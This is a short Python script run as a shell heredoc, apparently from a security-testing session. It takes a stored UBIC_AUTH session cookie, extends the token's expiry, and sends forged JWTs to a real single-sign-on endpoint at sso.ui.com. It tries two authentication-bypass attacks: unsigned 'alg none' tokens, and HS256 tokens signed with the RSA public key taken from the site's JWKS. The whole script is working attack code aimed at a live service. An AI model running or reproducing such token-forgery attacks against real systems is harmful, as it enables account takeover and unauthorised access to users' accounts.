python3 - <<'PY'
import json,base64,hmac,hashlib,time,urllib.request,urllib.error
c=json.load(open('result/accounts/accountA-cookies.json'))
tok=[x['value'] for x in c if x['name']=='UBIC_AUTH'][0]
payload=json.loads(base64.urlsafe_b64decode(tok.split('.')[1]+'='*(-len(tok.split('.')[1])%4)))
payload['exp']=int(time.time())+3600; payload['expiry']=payload['exp']
def b64(o): return base64.urlsafe_b64encode(json.dumps(o,separators=(',',':')).encode()).rstrip(b'=').decode()
p=b64(payload)
def call(name,t):
    req=urllib.request.Request('https://sso.ui.com/api/sso/v1/user/self',headers={'Cookie':'UBIC_AUTH='+t})
    try:
        r=urllib.request.urlopen(req,timeout=20); print(name,r.status,r.read(120))
    except urllib.error.HTTPError as e: print(name,e.code,e.read(120))
# alg none
h=b64({'alg':'none','typ':'JWT'})
call('alg-none',h+'.'+p+'.')
call('alg-none-sig',h+'.'+p+'.AAAA')
# HS256 with public key as secret
import subprocess, tempfile, os
pw=json.load(urllib.request.urlopen('https://sso.ui.com/.well-known/jwks.json'))
k=pw['keys'][0]
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
n=int.from_bytes(base64.urlsafe_b64decode(k['n']+'='*(-len(k['n'])%4)),'big')
e=int.from_bytes(base64.urlsafe_b64decode(k['e']+'='*(-len(k['e'])%4)),'big')
pub=rsa.RSAPublicNumbers(e,n).public_key()
pem=pub.public_bytes(serialization.Encoding.PEM,serialization.PublicFormat.SubjectPublicKeyInfo)
h2=b64({'alg':'HS256','typ':'JWT','kid':k['kid']})
msg=(h2+'.'+p).encode()
sig=base64.urlsafe_b64encode(hmac.new(pem,msg,hashlib.sha256).digest()).rstrip(b'=').decode()
call('hs256-pubkey',h2+'.'+p+'.'+sig)
